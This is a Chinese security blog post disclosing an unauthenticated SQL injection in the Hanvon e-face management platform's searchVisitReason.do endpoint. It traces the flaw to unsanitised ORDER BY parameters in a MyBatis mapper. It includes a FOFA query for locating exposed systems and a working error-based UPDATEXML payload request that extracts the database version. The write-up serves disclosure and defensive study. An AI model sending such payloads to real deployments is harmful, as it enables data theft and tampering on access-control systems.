---
title: "汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-searchvisitreason.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/1 12:22
* 588浏览
* [0评论](#comment)
* 34分钟阅读

深入探索

网络安全会议

编码转换工具

漏洞扫描器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `searchVisitReason.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `VisitorConfigManageController` 里关于 `searchVisitReason` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/searchVisitReason.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson searchVisitReason(@RequestParam(required = false,value = "visitReasonName") String visitReasonName, @RequestParam(required = false,value = "visitReasonCode") String visitReasonCode, @RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson requestJson = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            VisitorMapParam visitorMapParam = new VisitorMapParam();
            visitorMapParam.setVisitReasonCode(visitReasonCode);
            visitorMapParam.setVisitReasonName(visitReasonName);
            visitorMapParam.setOrder(order);
            visitorMapParam.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            MethodResult<List<VisitReasonTpm>> result = this.visitorConfigAsm.queryVisitorReason(visitorMapParam);
            List<VisitReasonTpm> visitReasonTpmList = (List)result.getResult();
```

深入探索

安全运维咨询

企业安全咨询

JSON处理工具

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 VisitorConfigDsm.xml

代码安全审计

```
<select id="queryVisitorReason" resultMap="visitReasonMap">
        SELECT ng_id,sz_code,sz_name,ng_creator,ts_create,ts_modify,ng_modify_id
        FROM vis_reason

          WHERE  1 = 1
            <!--<if test="visitorMapParam.visitReason != null">-->
                <!--AND sz_name like CONCAT(CONCAT('%',#{visitorMapParam.visitReason}),'%')-->
            <!--</if>-->
            <if test="visitReasonName != null">
                AND sz_name LIKE CONCAT(CONCAT('%',#{visitReasonName}),'%')
            </if>
            <if test="visitReasonCode != null">
                AND (sz_code LIKE CONCAT(CONCAT('%',#{visitReasonCode}),'%')
                OR sz_name LIKE CONCAT(CONCAT('%',#{visitReasonCode}),'%'))
            </if>
            ORDER BY
            <if test="order == null or order == ''">
                ts_create desc
            </if>
            <if test="order != null and order != ''">
                ${columnKey} ${order}
            </if>

    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/visitorConfigManage/searchVisitReason.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&groupId=1 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞](images/img-001-95b7f062200b.webp)](https://image.mrxn.net/20de18fd57354e489ade1371879bd5b0.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 searchVisitReason.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-searchVisitReason-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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